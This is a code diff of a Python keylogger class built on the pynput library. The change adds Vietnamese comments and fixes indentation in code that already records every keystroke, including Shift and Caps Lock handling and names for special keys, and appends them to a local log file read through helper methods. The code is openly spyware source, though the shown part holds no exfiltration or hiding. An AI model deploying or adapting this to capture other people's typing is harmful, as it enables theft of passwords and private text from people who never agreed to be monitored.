@@ -1,30 +1,37 @@
+# Import thư viện pynput để tương tác với sự kiện từ bàn phím và import thư viện threading để hỗ trợ việc sử dụng luồng đồng thời.
 from pynput import keyboard
 import threading
 
+# Định nghĩa lớp Keylogger.
 class Keylogger:
     def __init__(self, path="./tmp_files/keylog.txt"):
+        # Khởi tạo đối tượng Keylogger với đường dẫn file log mặc định là "./tmp_files/keylog.txt".
         self.path = path
-        self.caps = False
-        self.shift = False
-        self.thread = None
-        self.listener = None
-        self.clear_log()
+        self.caps = False  # Trạng thái của phím Caps Lock
+        self.shift = False  # Trạng thái của phím Shift
+        self.thread = None  # Đối tượng Thread để quản lý việc lắng nghe phím
+        self.listener = None  # Đối tượng Listener để lắng nghe sự kiện phím
+        self.clear_log()  # Xóa nội dung file log trước khi bắt đầu lắng nghe phím
 
+    # Phương thức start lắng nghe phím.
     def start(self):
         self.thread = threading.Thread(target=self._start_listening)
         self.thread.start()
 
+    # Phương thức stop lắng nghe phím.
     def stop(self):
         if self.thread and self.thread.is_alive():
             self._stop_listening()
             self.thread.join()
 
+    # Phương thức xóa nội dung file log.
     def clear_log(self):
         if not self.thread or not self.thread.is_alive():
             return "Keylogger is not running"
         with open(self.path, "w") as file:
             file.write("")
 
+    # Phương thức đọc nội dung file log.
     def read_log(self):
         if not self.thread or not self.thread.is_alive():
             return "Keylogger is not running"
@@ -34,17 +41,21 @@ class Keylogger:
             return "Log is empty"
         return content
 
+    # Phương thức bắt đầu lắng nghe sự kiện phím.
     def _start_listening(self):
         self.listener = keyboard.Listener(on_press=self._on_press)
         self.listener.start()
         self.listener.join()
 
+    # Phương thức dừng lắng nghe sự kiện phím.
     def _stop_listening(self):
         if self.listener:
             self.listener.stop()
 
+    # Phương thức xử lý sự kiện phím được nhấn.
     def _on_press(self, key):
         try:
+            # Kiểm tra và xử lý các trạng thái phím Caps Lock và Shift
             if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
                 self.shift = True
             elif key == keyboard.Key.caps_lock:
@@ -52,19 +63,21 @@ class Keylogger:
 
             char = None
             if hasattr(key, 'char'):
-                    char = key.char
-                    if char.isalpha():
-                        char = self._handle_alphabetic_keys(char)
-                    with open(self.path, "a") as file:
-                        file.write(char)
+                char = key.char
+                if char.isalpha():
+                    char = self._handle_alphabetic_keys(char)
+                with open(self.path, "a") as file:
+                    file.write(char)
             else: 
                 char = self._handle_special_keys(key)
                 with open(self.path, "a") as file:
-                        file.write(char)
+                    file.write(char)
         except AttributeError:
             pass
-
+    
+    # Phương thức xử lý các phím đặc biệt.
     def _handle_special_keys(self, key):
+        # Danh sách các phím đặc biệt và tương ứng với nội dung của chúng.
         special_keys = {
             keyboard.Key.space: " ",
             keyboard.Key.enter: "Enter\n",
@@ -104,13 +117,16 @@ class Keylogger:
             keyboard.Key.f11: "F11",
             keyboard.Key.f12: "F12"
         }
-
+        
+        # Trả về tên của phím đặc biệt nếu có trong danh sách, ngược lại trả về chuỗi trống.
         if key in special_keys:
             return special_keys[key]
 
         return ""
 
+    # Phương thức xử lý các phím chữ.
     def _handle_alphabetic_keys(self, char):
+        # Xử lý việc viết hoa/viết thường dựa trên trạng thái của phím Shift và Caps Lock.
         if self.shift ^ self.caps:
             char = char.upper()
         else:
